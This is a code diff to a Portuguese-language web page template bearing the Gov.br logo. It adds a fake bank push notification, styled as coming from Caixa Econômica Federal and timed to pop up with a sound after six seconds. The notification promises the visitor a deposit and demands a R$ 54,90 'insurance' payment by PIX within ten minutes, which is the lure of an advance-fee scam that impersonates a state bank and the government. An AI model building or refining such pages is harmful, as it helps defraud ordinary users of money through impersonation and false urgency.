@@ -285,9 +285,62 @@
             width: 100px;
             margin: 0 auto 0.8rem;
         }
+        
+        /* Estilos para notificação */
+        .payment-notification {
+            width: 100%;
+            max-width: 380px;
+            background-color: white;
+            border-radius: 12px;
+            position: fixed;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            z-index: 1000;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            padding: 12px;
+            opacity: 0;
+            transition: all 0.3s ease-out;
+        }
+        
+        .payment-notification.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        
+        .payment-notification.hide {
+            animation: slideUp 0.3s ease-in forwards;
+        }
+        
+        @keyframes slideUp {
+            0% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-100%); }
+        }
     </style>
 </head>
 <body>
+    <!-- Notificação adicional -->
+    <div id="paymentNotification" class="payment-notification">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
+            <div style="flex-grow: 1; padding-right: 10px;">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <div style="width: 24px; height: 24px; border-radius: 6px; margin-right: 8px; overflow: hidden;">
+                        <img src="https://logodownload.org/wp-content/uploads/2017/10/caixa-logo-0.png" alt="Caixa logo" style="width: 100%; height: 100%; object-fit: cover;">
+                    </div>
+                    <span style="color: #555; font-size: 14px;">Caixa Econômica Federal • agora</span>
+                </div>
+                <div style="font-size: 18px; font-weight: 700; margin-bottom: 5px;">Você vai receber R$ {{ amount }}0,00</div>
+                <div style="font-size: 14px; color: #333; line-height: 1.4;">
+                    Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$ 54,90 para depositar R$ {{ amount }}0,00 em sua conta {{ bank|default("Santander") }}. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
+                </div>
+            </div>
+            <div style="width: 48px; height: 48px; border-radius: 8px; flex-shrink: 0; overflow: hidden;">
+                <img src="https://logodownload.org/wp-content/uploads/2017/10/caixa-logo-0.png" alt="Caixa logo" style="width: 100%; height: 100%; object-fit: cover;">
+            </div>
+        </div>
+    </div>
+    
     <!-- Header -->
     <div class="header">
         <img alt="Logo Gov.br" class="logo" src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"/>
@@ -553,6 +606,99 @@
                     );
                 }
             });
+        </script>
+        
+        <!-- Script para notificação adicional -->
+        <script>
+            // Função para exibir a notificação após 6 segundos
+            document.addEventListener('DOMContentLoaded', function() {
+                // Garantir que os elementos estão carregados
+                setTimeout(function() {
+                    const paymentNotification = document.getElementById('paymentNotification');
+                    if (paymentNotification) {
+                        // Exibir a notificação
+                        paymentNotification.classList.add('show');
+                        
+                        // Configurar um toque para cancelar a notificação
+                        let touchStartX, touchEndX;
+                        
+                        paymentNotification.addEventListener('touchstart', function(e) {
+                            touchStartX = e.changedTouches[0].screenX;
+                        }, false);
+                        
+                        paymentNotification.addEventListener('touchend', function(e) {
+                            touchEndX = e.changedTouches[0].screenX;
+                            handleSwipe();
+                        }, false);
+                        
+                        paymentNotification.addEventListener('click', function() {
+                            hideNotification();
+                        });
+                        
+                        function handleSwipe() {
+                            if (touchEndX < touchStartX) {
+                                // Swipe para a esquerda
+                                hideNotification('left');
+                            } else if (touchEndX > touchStartX) {
+                                // Swipe para a direita
+                                hideNotification('right');
+                            }
+                        }
+                        
+                        function hideNotification(direction) {
+                            paymentNotification.classList.add('hide');
+                            paymentNotification.classList.remove('show');
+                            
+                            setTimeout(function() {
+                                paymentNotification.style.display = 'none';
+                            }, 300);
+                        }
+                        
+                        // Reproduzir som de notificação
+                        playNotificationSound();
+                    }
+                }, 6000); // Exibir a notificação após 6 segundos
+            });
+            
+            // Função para tocar som de notificação
+            function playNotificationSound() {
+                try {
+                    // Tentar diferentes abordagens para compatibilidade máxima
+                    
+                    // Método 1: Audio API
+                    const audio = new Audio('/static/sounds/notification.mp3');
+                    audio.play().catch(e => {
+                        console.log('Erro ao reproduzir áudio (método 1): ', e);
+                        
+                        // Método 2: elemento de áudio na página
+                        const audioElement = document.createElement('audio');
+                        audioElement.src = '/static/audio/notification.mp3';
+                        audioElement.play().catch(e => {
+                            console.log('Erro ao reproduzir áudio (método 2): ', e);
+                            
+                            // Se nenhum método acima funcionar, usar AudioContext (melhor suporte mobile)
+                            try {
+                                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                                const audioContext = new AudioContext();
+                                fetch('/static/sounds/notification.mp3')
+                                    .then(response => response.arrayBuffer())
+                                    .then(arrayBuffer => audioContext.decodeAudioData(arrayBuffer))
+                                    .then(audioBuffer => {
+                                        const source = audioContext.createBufferSource();
+                                        source.buffer = audioBuffer;
+                                        source.connect(audioContext.destination);
+                                        source.start(0);
+                                    })
+                                    .catch(e => console.log('Erro ao reproduzir áudio (método 3): ', e));
+                            } catch (e) {
+                                console.log('Erro ao reproduzir áudio (método final): ', e);
+                            }
+                        });
+                    });
+                } catch (e) {
+                    console.log('Erro ao reproduzir áudio: ', e);
+                }
+            }
         </script>
 </body>
 </html>
